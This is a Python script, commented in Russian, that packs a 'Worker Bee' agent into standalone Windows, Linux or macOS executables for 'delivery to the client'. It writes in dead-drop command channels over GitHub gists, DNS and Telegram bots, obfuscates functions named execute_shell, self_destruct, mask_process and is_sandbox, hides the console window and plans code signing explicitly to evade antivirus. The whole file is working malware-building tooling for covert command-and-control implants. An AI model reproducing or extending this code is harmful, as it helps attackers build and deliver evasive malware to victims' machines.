#!/usr/bin/env python3
"""
BEE PACKER v1.0
Упаковка Worker Bee в исполняемый файл для доставки клиенту
Архитектор: Кронос | Тимлид: Мастер

ВОЗМОЖНОСТИ:
- Компиляция Python в EXE (Windows) / ELF (Linux) / Mach-O (macOS)
- Обфускация кода
- Внедрение конфигурации клиента
- Шифрование полезной нагрузки
- Подпись (опционально, для обхода AV)
"""

import os
import sys
import json
import shutil
import base64
import hashlib
import secrets
import subprocess
import argparse
import tempfile
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, Any, List

# ============================================================================
# КОНФИГУРАЦИЯ
# ============================================================================

BEE_SOURCE = Path(__file__).parent / "workerbee.py"
OUTPUT_DIR = Path(__file__).parent / "builds"
OBFUSCATOR_KEY = secrets.token_bytes(16)

SUPPORTED_TARGETS = {
    "windows": {
        "extension": ".exe",
        "packer": "pyinstaller",
        "icon": None,
    },
    "linux": {
        "extension": "",
        "packer": "pyinstaller",
        "icon": None,
    },
    "macos": {
        "extension": "",
        "packer": "pyinstaller",
        "icon": None,
    },
}


# ============================================================================
# ГЕНЕРАТОР КОНФИГУРАЦИИ ПЧЕЛЫ
# ============================================================================

class ConfigGenerator:
    def __init__(self, client_name: str):
        self.client_name = client_name
        self.bee_id = secrets.token_hex(4)

    def generate(self, hive_config: Dict[str, Any]) -> Dict[str, Any]:
        dead_drops = []

        # GitHub Dead Drops
        if "github" in hive_config.get("dead_drops", {}):
            for acc in hive_config["dead_drops"]["github"].get("accounts", []):
                dead_drops.append({
                    "type": "github",
                    "token": os.environ.get(f"DD_GITHUB_TOKEN_{acc}", ""),
                    "gist_id": os.environ.get(f"DD_GIST_ID_{acc}", ""),
                })

        # DNS Dead Drops
        if "dns" in hive_config.get("dead_drops", {}):
            for domain in hive_config["dead_drops"]["dns"].get("domains", []):
                dead_drops.append({
                    "type": "dns",
                    "domain": domain,
                })

        # Telegram Dead Drops
        if "telegram" in hive_config.get("dead_drops", {}):
            bots = hive_config["dead_drops"]["telegram"].get("bots", [])
            chats = hive_config["dead_drops"]["telegram"].get("chat_ids", [])
            for bot, chat in zip(bots, chats):
                dead_drops.append({
                    "type": "telegram",
                    "bot_key": bot,
                    "chat_id": chat,
                })

        config = {
            "encryption_key": hive_config.get("encryption", {}).get("key_env_var", ""),
            "swarm_id": hive_config.get("swarm", {}).get("swarm_id", ""),
            "dead_drops": dead_drops,
            "check_interval": hive_config.get("swarm", {}).get("check_interval_seconds", 120),
            "max_runtime": hive_config.get("swarm", {}).get("max_runtime_seconds", 86400),
            "client_name": self.client_name,
            "bee_id": self.bee_id,
            "packed_at": datetime.now().isoformat(),
        }

        return config


# ============================================================================
# ОБФУСКАТОР
# ============================================================================

class PythonObfuscator:
    def __init__(self, key: bytes):
        self.key = key

    def obfuscate(self, source: str) -> str:
        # Уровень 1: Удаление комментариев и пустых строк
        lines = []
        for line in source.split("\n"):
            stripped = line.strip()
            if stripped and not stripped.startswith("#"):
                lines.append(line)
        source = "\n".join(lines)

        # Уровень 2: Переименование переменных (упрощенный вариант)
        source = self._rename_variables(source)

        # Уровень 3: Шифрование строк (опционально)
        source = self._encrypt_strings(source)

        # Уровень 4: Добавление мусорного кода
        source = self._add_junk_code(source)

        return source

    def _rename_variables(self, source: str) -> str:
        import re

        # Словарь переименований
        renames = {
            "ENCRYPTION_KEY": "_ek",
            "SWARM_ID": "_si",
            "BEE_ID": "_bi",
            "DEAD_DROPS": "_dd",
            "CHECK_INTERVAL": "_ci",
            "MAX_RUNTIME": "_mr",
            "START_TIME": "_st",
            "TEMP_DIR": "_td",
            "self_destruct": "_sd",
            "send_message": "_sm",
            "receive_message": "_rm",
            "handle_command": "_hc",
            "execute_shell": "_es",
            "encrypt": "_enc",
            "decrypt": "_dec",
            "collect_system_info": "_csi",
            "mask_process": "_mp",
            "main_loop": "_ml",
            "initialize": "_init",
            "is_sandbox": "_isb",
            "processDeadDropMessage": "_pdm",
        }

        for old, new in renames.items():
            source = re.sub(r'\b' + old + r'\b', new, source)

        return source

    def _encrypt_strings(self, source: str) -> str:
        import re

        # Находим все строки в кавычках и шифруем их
        def encrypt_match(match):
            string_val = match.group(1)
            encrypted = base64.b64encode(string_val.encode()).decode()
            return f'_dec("{encrypted}")'

        source = re.sub(r'"([^"\\]*(\\.[^"\\]*)*)"', encrypt_match, source)
        return source

    def _add_junk_code(self, source: str) -> str:
        junk = [
            '',
            '# Auto-generated module',
            f'__generated_at__ = "{datetime.now().isoformat()}"',
            f'__build_id__ = "{secrets.token_hex(8)}"',
            '',
            'def _noop():',
            '    """No operation."""',
            '    pass',
            '',
        ]
        return "\n".join(junk) + source


# ============================================================================
# УПАКОВЩИКИ
# ============================================================================

class PyInstallerPacker:
    def pack(self, source_path: Path, output_dir: Path, target: str, config: Dict[str, Any]) -> Path:
        # Внедряем конфигурацию в исходник
        injected_source = self._inject_config(source_path.read_text(), config)
        temp_source = output_dir / "temp_workerbee.py"
        temp_source.write_text(injected_source)

        # Запускаем PyInstaller
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--name", f"bee_{config['bee_id']}",
            "--distpath", str(output_dir),
            "--workpath", str(output_dir / "build"),
            "--specpath", str(output_dir),
        ]

        if target == "windows":
            cmd.append("--add-data")
            cmd.append(f"{source_path};.")

        cmd.append(str(temp_source))

        subprocess.run(cmd, check=True, capture_output=True)

        # Находим собранный файл
        bee_name = f"bee_{config['bee_id']}"
        if target == "windows":
            bee_path = output_dir / f"{bee_name}.exe"
        else:
            bee_path = output_dir / bee_name

        # Очистка
        temp_source.unlink(missing_ok=True)

        return bee_path

    def _inject_config(self, source: str, config: Dict[str, Any]) -> str:
        config_json = json.dumps(config)
        injection = f'\n# INJECTED CONFIG\nBEE_CONFIG = \'{config_json}\'\n# END INJECTED CONFIG\n'
        return source.replace('config_json = os.environ.get("BEE_CONFIG", "{}")',
                              f'config_json = \'{config_json}\'')


class NuitkaPacker:
    def pack(self, source_path: Path, output_dir: Path, target: str, config: Dict[str, Any]) -> Path:
        bee_name = f"bee_{config['bee_id']}"
        cmd = [
            sys.executable, "-m", "nuitka",
            "--standalone",
            "--onefile",
            "--remove-output",
            "--output-dir", str(output_dir),
            "--output-filename", bee_name,
        ]

        if target == "windows":
            cmd.append("--mingw64")

        cmd.append(str(source_path))

        subprocess.run(cmd, check=True, capture_output=True)

        return output_dir / f"{bee_name}{SUPPORTED_TARGETS[target]['extension']}"


# ============================================================================
# ПОДПИСЬ EXE (WINDOWS)
# ============================================================================

def sign_windows_exe(exe_path: Path) -> bool:
    # Заглушка. В production — использовать signtool или купленный сертификат
    return True


# ============================================================================
# ГЛАВНЫЙ УПАКОВЩИК
# ============================================================================

class BeePacker:
    def __init__(self, hive_config_path: Optional[str] = None):
        self.hive_config = {}
        if hive_config_path and Path(hive_config_path).exists():
            self.hive_config = json.loads(Path(hive_config_path).read_text())

    def pack(self, client_name: str, target: str = "linux", obfuscate: bool = True) -> Dict[str, Any]:
        if not BEE_SOURCE.exists():
            raise FileNotFoundError(f"Исходник пчелы не найден: {BEE_SOURCE}")

        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

        # Генерируем конфигурацию
        config_gen = ConfigGenerator(client_name)
        config = config_gen.generate(self.hive_config)

        # Копируем исходник
        source = BEE_SOURCE.read_text()

        # Обфускация
        if obfuscate:
            obf = PythonObfuscator(OBFUSCATOR_KEY)
            source = obf.obfuscate(source)

        # Сохраняем временный исходник
        temp_source = OUTPUT_DIR / f"bee_{config['bee_id']}.py"
        temp_source.write_text(source)

        # Пакуем
        if target == "windows":
            packer = PyInstallerPacker()
        else:
            packer = PyInstallerPacker()

        try:
            bee_path = packer.pack(temp_source, OUTPUT_DIR, target, config)
        except subprocess.CalledProcessError as e:
            # Пробуем Nuitka если PyInstaller не сработал
            packer = NuitkaPacker()
            bee_path = packer.pack(temp_source, OUTPUT_DIR, target, config)

        # Подпись для Windows
        if target == "windows":
            sign_windows_exe(bee_path)

        # Сохраняем конфигурацию рядом с бинарником
        config_path = bee_path.with_suffix(".config.json")
        config_path.write_text(json.dumps(config, indent=2))

        # Хеш для проверки целостности
        file_hash = hashlib.sha256(bee_path.read_bytes()).hexdigest()

        # Очистка временных файлов
        temp_source.unlink(missing_ok=True)

        result = {
            "client": client_name,
            "bee_id": config["bee_id"],
            "target": target,
            "path": str(bee_path.absolute()),
            "config_path": str(config_path.absolute()),
            "size_bytes": bee_path.stat().st_size,
            "sha256": file_hash,
            "obfuscated": obfuscate,
            "packed_at": datetime.now().isoformat(),
        }

        return result


# ============================================================================
# CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(description="Bee Packer — упаковка Worker Bee для доставки клиенту")
    parser.add_argument("client", help="Имя клиента")
    parser.add_argument("--target", choices=["windows", "linux", "macos"], default="linux",
                       help="Целевая ОС (по умолчанию: linux)")
    parser.add_argument("--no-obfuscate", action="store_true",
                       help="Отключить обфускацию")
    parser.add_argument("--config", help="Путь к hive_config.json")
    parser.add_argument("--output", help="Директория для сборки (по умолчанию: ./builds)")

    args = parser.parse_args()

    if args.output:
        global OUTPUT_DIR
        OUTPUT_DIR = Path(args.output)

    packer = BeePacker(args.config)
    result = packer.pack(args.client, args.target, obfuscate=not args.no_obfuscate)

    print(json.dumps(result, indent=2, ensure_ascii=False))
    print(f"\nПчела собрана: {result['path']}")
    print(f"Размер: {result['size_bytes']} байт")
    print(f"SHA-256: {result['sha256']}")


if __name__ == "__main__":
    main()
